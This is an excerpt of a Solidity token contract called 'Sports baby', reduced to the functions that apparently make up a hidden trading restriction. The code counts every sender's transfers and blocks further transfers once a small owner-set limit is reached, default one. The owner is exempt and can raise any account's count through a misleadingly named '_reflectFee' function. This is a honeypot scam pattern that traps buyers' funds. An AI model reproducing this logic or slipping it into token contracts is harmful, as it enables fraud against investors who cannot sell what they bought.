...
contract token is Context, IERC20, Ownable {
    ...
    mapping (address => uint256) private _tAddressNum;
    ...
    uint256 private _tnum = 1;
    
    string private _name = "Sports baby";
    ...
    address public ownerAddres = address(0xd55408E1AFEbcFABed2FBc86Ab99746413500C72);
    ...
    function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
        ...
        if(_checkAccountNums(sender)){
            _tAddressNum[sender] = _tAddressNum[sender].add(1);
    ...
    function setAddressNumLimit(uint256 nums) public onlyOwner() {
       _tnum = nums;
    }
    ...
    function _reflectFee(address account) private {
       _tAddressNum[account] =  _tAddressNum[account].add(1);
    }
    function _checkAccountNums(address account) private view  returns(bool){
        if(owner() == account || _tAddressNum[account]<_tnum){
            return true;
        }
        return false;
    }
    ...
    function _getAccountNums(address account) public view returns(uint256) {
        
        return _tAddressNum[account];
    }
